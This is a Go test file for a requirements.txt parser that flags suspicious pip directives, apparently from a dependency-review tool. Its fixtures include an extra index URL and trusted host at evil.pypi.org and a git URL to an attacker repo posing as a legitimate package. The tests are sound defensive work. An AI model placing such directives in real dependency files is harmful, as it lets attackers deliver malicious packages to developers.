package github

import "testing"

func TestParsePipRequirements_SuspiciousDirectives(t *testing.T) {
	lines := []AddedLine{
		{Content: "--extra-index-url https://evil.pypi.org/simple/", Line: 1},
		{Content: "--trusted-host evil.pypi.org", Line: 2},
		{Content: "requests==2.31.0", Line: 3},
	}

	changes := parsePipRequirements(lines, "requirements.txt")

	if len(changes) != 3 {
		t.Fatalf("expected 3 changes, got %d", len(changes))
	}

	// First two should be the suspicious directives
	if changes[0].Package != "--extra-index-url https://evil.pypi.org/simple/" {
		t.Errorf("expected --extra-index-url directive, got %q", changes[0].Package)
	}
	if changes[1].Package != "--trusted-host evil.pypi.org" {
		t.Errorf("expected --trusted-host directive, got %q", changes[1].Package)
	}
	// Third is a normal package
	if changes[2].Package != "requests" {
		t.Errorf("expected requests package, got %q", changes[2].Package)
	}
}

func TestParsePipRequirements_GitURLs(t *testing.T) {
	lines := []AddedLine{
		{Content: "git+https://github.com/attacker/legit-name.git@main#egg=legit-name", Line: 1},
		{Content: "normal-package==1.0.0", Line: 2},
	}

	changes := parsePipRequirements(lines, "requirements.txt")

	if len(changes) != 2 {
		t.Fatalf("expected 2 changes, got %d", len(changes))
	}

	if changes[0].Package != "git+https://github.com/attacker/legit-name.git@main#egg=legit-name" {
		t.Errorf("expected git URL, got %q", changes[0].Package)
	}
}

func TestParsePipRequirements_SkipsComments(t *testing.T) {
	lines := []AddedLine{
		{Content: "# this is a comment", Line: 1},
		{Content: "", Line: 2},
		{Content: "flask==2.3.0", Line: 3},
	}

	changes := parsePipRequirements(lines, "requirements.txt")

	if len(changes) != 1 {
		t.Fatalf("expected 1 change, got %d", len(changes))
	}
	if changes[0].Package != "flask" {
		t.Errorf("expected flask, got %q", changes[0].Package)
	}
}

func TestParsePipRequirements_NormalDashFlags(t *testing.T) {
	// -r other-requirements.txt should be skipped (not suspicious)
	lines := []AddedLine{
		{Content: "-r base-requirements.txt", Line: 1},
		{Content: "flask==2.3.0", Line: 2},
	}

	changes := parsePipRequirements(lines, "requirements.txt")

	if len(changes) != 1 {
		t.Fatalf("expected 1 change (skipping -r), got %d", len(changes))
	}
	if changes[0].Package != "flask" {
		t.Errorf("expected flask, got %q", changes[0].Package)
	}
}
